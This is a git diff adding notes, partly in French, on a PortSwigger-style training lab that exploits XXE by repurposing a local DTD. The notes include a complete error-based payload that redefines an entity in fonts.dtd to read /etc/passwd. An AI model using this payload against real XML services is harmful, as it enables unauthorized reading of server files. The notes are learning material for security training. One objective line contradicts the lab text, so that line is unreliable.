@@ -104,3 +104,47 @@ To solve the lab, upload an image that displays the contents of the /etc/hostnam
 ```
 - upload xxe.svg
 - The content of /et/hostname will be in stocked in the svg.
+
+---
+```
+Lab: Exploiting XXE to retrieve data by repurposing a local DTD
+
+EXPERT
+
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+
+To solve the lab, trigger an error message containing the contents of the /etc/passwd file.
+
+You'll need to reference an existing DTD file on the server and redefine an entity from it. 
+```
+
+Objective: Read and submit the contents of the file /etc/hostname. 
+
+# Observations :
+
+https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md
+
+On obtient la liste des dtd locaux présent sur le système :
+![alt text for screen readers](local_dtd_founded.png "Text to show on mouseover")
+
+> DTD File: /usr/share/xml/fontconfig/fonts.dtd
+
+> Injectable entity: %constant
+
+> XXE Payload:
+
+```xml
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+
+    <!ENTITY % constant 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+
+    %local_dtd;
+]>
+<message></message>
+
